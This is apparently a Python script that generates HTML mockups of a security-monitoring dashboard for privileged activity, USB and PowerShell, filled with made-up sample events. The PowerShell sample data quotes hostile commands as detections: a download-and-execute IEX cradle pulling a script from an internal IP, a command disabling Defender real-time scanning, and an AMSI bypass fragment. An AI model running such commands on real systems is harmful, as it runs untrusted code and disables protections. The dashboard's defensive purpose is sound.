import os, re
_d = os.path.dirname(os.path.abspath(__file__))
exec(open(os.path.join(_d, 'evp3.py')).read().replace('v1(); v2(); v3()', ''))

def stacked(series, w=640, h=170, mx=None, hot=None):
    tot = [sum(s[1][i] for s in series) for i in range(7)]
    import math
    raw = mx or max(tot) * 1.1; step = 10 ** math.floor(math.log10(raw)); mx = math.ceil(raw / step * 2) * step / 2; x0 = 34; bw = (w - x0) / 7; out = ''
    for v in (0, round(mx / 2), round(mx)):
        y = h - 22 - v / mx * (h - 34)
        out += f'<line x1="{x0}" x2="{w}" y1="{y:.1f}" y2="{y:.1f}" stroke="{T["grid"]}"/><text x="{x0 - 6}" y="{y + 4:.1f}" text-anchor="end" class="ax">{v}</text>'
    for i in range(7):
        x = x0 + i * bw + bw * .22; ww = bw * .56; y = h - 22
        for _, vals, c in series:
            hh = vals[i] / mx * (h - 34); y -= hh
            out += f'<rect x="{x:.1f}" y="{y:.1f}" width="{ww:.1f}" height="{hh:.1f}" fill="{c}"/>'
        if hot is not None and i in hot:
            out += f'<rect x="{x - 3:.1f}" y="{y - 3:.1f}" width="{ww + 6:.1f}" height="{h - 22 - y + 3:.1f}" fill="none" stroke="#D12C2C" stroke-width="1.5"/>'
        out += f'<text x="{x + ww / 2:.1f}" y="{h - 6}" text-anchor="middle" class="ax">{DAYS[i]}</text>'
    leg = ''.join(f'<span><i style="background:{c}"></i>{n}</span>' for n, _, c in series)
    if hot: leg += '<span><i style="background:none;outline:1.5px solid #D12C2C"></i>Above normal</span>'
    return f'<svg viewBox="0 0 {w} {h}" width="100%">{out}</svg><div class="legend">{leg}</div>'

def toplist(rows):
    mx = max(v for _, v, _ in rows)
    return '<div class="mini">' + ''.join(f'<div><span>{l}</span><s style="width:{v / mx * 100:.0f}%;{"background:#D12C2C" if hot else ""}"></s><b>{v}</b></div>' for l, v, hot in rows) + '</div>'

def build(name, nav, title, crumb, stats, chart_title, chart_note, chart, top_title, top, flagged_note, flagged, total, filters_, cols, rows, pages):
    kp = '<div class="ev6" style="grid-template-columns:repeat(4,1fr)">' + ''.join(f'<div class="panel ec {k}"><div class="l">{icon(i, 15)}{l}</div><div class="v">{v}</div><div class="d">{d}</div></div>' for k, i, l, v, d in stats) + '</div>'
    fl = ''.join(f'<div class="dc {s}"><div class="b"><b>{t}</b><span>{d}</span></div><div class="m2">{w}</div></div>' for s, t, d, w in flagged)
    dn = icon("chevron-down", 13)
    fb = f'<div class="fbar"><span class="dd txt">{icon("search", 14)}Filter text…</span>' + ''.join(f'<span class="dd">{f} <b>{"All" if f == "Day" else "Any"}</b>{dn}</span>' for f in filters_) + '</div>'
    th = '<thead><tr>' + ''.join(f'<th>{c}</th>' for c in cols) + '</tr></thead>'
    tb = ''
    for r in rows:
        cells = list(r[:-1]); sev = r[-1]
        tds = f'<td class="mono">{cells[0]}</td><td><b>{cells[1]}</b></td>' + ''.join(f'<td style="white-space:normal">{c}</td>' for c in cells[2:])
        sv = f'<span class="sv {sev}">{SEVL(sev)}</span>' if sev else '<span class="mute">—</span>'
        tb += f'<tr>{tds}<td>{sv}</td></tr>'
    body = aside(nav) + f'''<main>{head(title, crumb)}{kp}
<div class="row" style="grid-template-columns:1.5fr 1fr">
<div class="panel"><div class="ph"><h2>{icon("calendar-range", 17)}{chart_title}</h2><span class="pm">{chart_note}</span></div>{chart}</div>
<div class="panel"><div class="ph"><h2>{icon("list-filter", 17)}{top_title}</h2><span class="pm">Red = flagged</span></div>{top}</div></div>
<div class="panel" style="margin-bottom:12px"><div class="ph"><h2>{icon("shield-alert", 17)}Flagged this week</h2><span class="pm">{flagged_note}</span></div><div class="dstrip">{fl}</div></div>
<div class="panel"><div class="ph"><h2>{icon("list-filter", 17)}{total}</h2><span class="pm">Click a row for the full event</span></div>{fb}
<table class="res">{th}<tbody>{tb}</tbody></table>
<div class="pager"><span>Showing 1–{len(rows)} of {pages}</span><span class="p"><i class="on">1</i><i>2</i><i>3</i><i>…</i></span><span>Export CSV</span></div></div>
</main>'''
    body = re.sub(r'<a>(<svg[^>]*>(?:(?!</svg>).)*</svg><span>' + re.escape(nav) + '</span>)', lambda m: '<a class="on">' + m.group(1), body, count=1, flags=re.S)
    html = f'<!doctype html><html lang="en"><head><meta charset="utf-8"><title>{name}</title><style>{T["css"]}{EXTRA}{CALM}{C3}{C4}{C5}{C6}{C7}{C8}{C9}{C10}{C11}</style></head><body>{body}</body></html>'
    open(f'{SP}/{name}.html', 'w').write(html)

# ---------- Privileged activity ----------
build('X1-privileged', 'Privileged activity', 'Privileged activity', 'Weekly report · Events · 3,912 privileged actions by 11 people on 22 systems',
      [("", "key-round", "Privileged actions", "3,912", "normal: 3,700–4,000"), ("warn", "moon", "After hours", "14", "jsmith · ubu-ws12"),
       ("bad", "user-plus", "New admins", "2", "tempuser, mjones"), ("", "users", "People", "11", "4 administrators")],
      "Privileged actions per day", "By kind",
      stacked([("Admin logon", [310, 360, 342, 351, 120, 95, 402], "#0B5FFF"), ("sudo / run as admin", [180, 210, 190, 205, 60, 70, 230], "#7FA6E8"),
               ("Security settings", [8, 12, 6, 9, 2, 3, 31], "#E08A00")], hot=[6]),
      "Top people", toplist([("admin_jd", 188, True), ("jsmith", 131, True), ("svc_patch", 71, False), ("dchen", 64, False), ("mjones", 22, True), ("tempuser", 4, True)]),
      "3 of 3,912 privileged actions are part of something unusual",
      [("high", "New admin, then auditing turned off", "admin_jd added tempuser to Administrators on WS-07, then turned off USB auditing 18 min later.", "Mon 09:20"),
       ("high", "New member of Domain Admins", "admin_jd added mjones to Domain Admins on SRV-DC01.", "Fri 11:02"),
       ("medium", "Admin work after hours", "jsmith ran 14 sudo commands on ubu-ws12 between 23:10 and 23:41.", "Sun 23:10")],
      "All privileged actions · 3,912", ["Severity", "System", "Person", "Kind", "Privilege", "Day"],
      ["Time", "System", "Person", "Kind", "What they did", "Severity"],
      [("28 Sep 09:38:02", "WS-07", "admin_jd", "Security settings", "Changed audit policy: Removable Storage → No auditing", "high"),
       ("28 Sep 09:20:14", "WS-07", "admin_jd", "Security settings", "Added tempuser to Administrators", "high"),
       ("28 Sep 09:19:50", "WS-07", "admin_jd", "Admin logon", "Logon with SeDebugPrivilege, SeBackupPrivilege", ""),
       ("27 Sep 23:41:07", "ubu-ws12", "jsmith", "sudo", "sudo systemctl restart sshd", "medium"),
       ("27 Sep 23:10:22", "ubu-ws12", "jsmith", "sudo", "sudo vi /etc/ssh/sshd_config", "medium"),
       ("27 Sep 14:02:11", "WS-05", "svc_patch", "Run as admin", "C:\\Windows\\System32\\msiexec.exe /i KB5043145.msi", ""),
       ("26 Sep 10:15:33", "alma-db01", "dchen", "sudo", "sudo dnf update postgresql-server", ""),
       ("25 Sep 11:02:47", "SRV-DC01", "admin_jd", "Security settings", "Added mjones to Domain Admins", "high"),
       ("24 Sep 08:41:09", "WS-02", "dchen", "Admin logon", "Remote Desktop with admin rights", "")], "3,912")

# ---------- USB ----------
build('X2-usb', 'USB & removable', 'USB & removable', 'Weekly report · Events · 64 USB events on 9 systems',
      [("", "usb", "USB events", "64", "normal: 40–60"), ("bad", "triangle-alert", "New devices", "3", "first seen this week"),
       ("warn", "hard-drive", "Files copied to USB", "212", "1 device · WS-07"), ("", "server", "Systems", "9", "of 24")],
      "USB events per day", "By kind",
      stacked([("Connected / removed", [5, 8, 10, 6, 3, 2, 8], "#0B5FFF"), ("Files copied", [0, 0, 1, 0, 0, 0, 14], "#E08A00"), ("Blocked", [1, 1, 3, 1, 0, 0, 1], "#7FA6E8")], hot=[6]),
      "Top devices", toplist([("Kingston DT 3.0", 14, True), ("USB keyboard", 12, False), ("Samsung T7", 9, True), ("SanDisk Cruzer", 8, False), ("Seagate HDD", 6, False), ("Apple iPhone", 5, False)]),
      "3 of 64 USB events are part of something unusual",
      [("high", "212 files copied to a new USB drive", "tempuser copied 1.4 GB to a Kingston DataTraveler on WS-07, 11 minutes after being made an admin.", "Mon 09:31"),
       ("medium", "New storage device on a server", "Samsung T7 SSD plugged into SRV-FS01 by dchen.", "Sun 14:12"),
       ("medium", "New USB storage device", "Kingston DataTraveler (0951:1666) first seen on WS-02.", "Thu 14:31")],
      "All USB events · 64", ["Severity", "System", "Person", "Device", "Kind", "Day"],
      ["Time", "System", "Person", "Device", "What happened", "Severity"],
      [("28 Sep 10:12:40", "WS-07", "tempuser", "Kingston DataTraveler 3.0", "Removed", ""),
       ("28 Sep 09:31:05", "WS-07", "tempuser", "Kingston DataTraveler 3.0", "Copied 212 files to E:\\export\\ (1.4 GB)", "high"),
       ("28 Sep 09:29:40", "WS-07", "tempuser", "Kingston DataTraveler 3.0", "Connected · drive E:", ""),
       ("27 Sep 14:12:03", "SRV-FS01", "dchen", "Samsung T7 SSD", "Connected · first time seen", "medium"),
       ("26 Sep 10:44:18", "WS-11", "rgarcia", "Apple iPhone", "Blocked by device policy", ""),
       ("25 Sep 11:20:51", "ubu-ws12", "jsmith", "SanDisk Cruzer Blade", "Mounted at /media/jsmith/SANDISK", ""),
       ("24 Sep 14:31:22", "WS-02", "mjones", "Kingston DataTraveler 3.0", "Connected · first time seen", "medium"),
       ("24 Sep 09:02:51", "ubu-ws12", "jsmith", "SanDisk Cruzer Blade", "Mounted at /media/jsmith/SANDISK", ""),
       ("23 Sep 08:12:07", "WS-05", "kpatel", "Generic USB keyboard", "Connected", "")], "64")

# ---------- PowerShell ----------
build('X3-powershell', 'PowerShell', 'PowerShell', 'Weekly report · Events · 47 script blocks logged on 12 Windows systems',
      [("", "terminal", "Scripts logged", "47", "normal: 30–60"), ("bad", "triangle-alert", "Suspicious", "3", "WS-09"),
       ("", "server", "Systems", "12", "of 16 Windows"), ("warn", "shield-check", "Logging off", "1", "WS-13 · see Audit health")],
      "Scripts per day", "By kind",
      stacked([("Routine", [6, 8, 5, 7, 2, 1, 9], "#0B5FFF"), ("Warning from PowerShell", [0, 1, 0, 1, 0, 0, 1], "#7FA6E8"), ("Suspicious", [3, 0, 0, 0, 0, 0, 0], "#D12C2C")]),
      "Top systems", toplist([("WS-09", 11, True), ("SRV-DC01", 9, False), ("WS-05", 7, False), ("WS-02", 6, False), ("WS-11", 5, False), ("WS-04", 4, False)]),
      "3 of 47 scripts look suspicious",
      [("medium", "Script downloads and runs code", "IEX (New-Object Net.WebClient).DownloadString('http://10.1.1.99/a.ps1') on WS-09 as SYSTEM.", "Tue 15:47"),
       ("medium", "Turns off Defender scanning", "Set-MpPreference -DisableRealtimeMonitoring $true on WS-09.", "Tue 15:48"),
       ("medium", "AMSI bypass attempt", "[Ref].Assembly.GetType('…AmsiUtils') on WS-09.", "Tue 15:48")],
      "All PowerShell scripts · 47", ["Severity", "System", "Person", "Kind", "Day"],
      ["Time", "System", "Person", "Script (first line)", "Kind", "Severity"],
      [("28 Sep 14:20:02", "SRV-DC01", "dchen", "<span class='mono'>Get-ADUser -Filter * -Properties LastLogonDate</span>", "Routine", ""),
       ("28 Sep 09:12:44", "WS-05", "svc_patch", "<span class='mono'>Install-WindowsUpdate -KBArticleID KB5043145</span>", "Routine", ""),
       ("27 Sep 11:30:10", "WS-02", "mjones", "<span class='mono'>Get-ChildItem \\\\SRV-FS01\\eng -Recurse</span>", "Routine", ""),
       ("25 Sep 16:02:51", "WS-11", "rgarcia", "<span class='mono'>Import-Module ActiveDirectory</span>", "Warning", ""),
       ("22 Sep 15:48:20", "WS-09", "SYSTEM", "<span class='mono'>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')…</span>", "Suspicious", "medium"),
       ("22 Sep 15:48:02", "WS-09", "SYSTEM", "<span class='mono'>Set-MpPreference -DisableRealtimeMonitoring $true</span>", "Suspicious", "medium"),
       ("22 Sep 15:47:31", "WS-09", "SYSTEM", "<span class='mono'>IEX (New-Object Net.WebClient).DownloadString('http://10.1.1.99/a.ps1')</span>", "Suspicious", "medium"),
       ("22 Sep 10:05:18", "WS-04", "admin_jd", "<span class='mono'>Get-EventLog -LogName Security -Newest 50</span>", "Routine", "")], "47")
